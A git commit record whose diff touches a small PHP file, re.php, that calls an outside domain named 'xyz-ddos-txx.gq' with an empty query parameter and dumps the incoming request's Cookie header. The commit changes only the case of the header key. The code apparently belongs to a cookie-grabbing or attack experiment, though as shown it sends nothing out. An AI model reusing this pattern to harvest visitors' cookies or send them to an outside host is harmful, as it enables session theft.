17ecc55e8bc760b1d6a472ab7302502bf879766f
Việt Nguyễn Đức <nguyenducviet1998tk@gmail.com>
2018-12-04 14:20:54 +0700

    up

--- projects/re.php
+++ projects/re.php
@@ -5,5 +5,5 @@ $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, "http://xyz-ddos-txx.gq/?d="); 
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
 curl_exec($ch); 
-var_dump(getallheaders()['cookie']) ;
+var_dump(getallheaders()['Cookie']) ;
 ?>
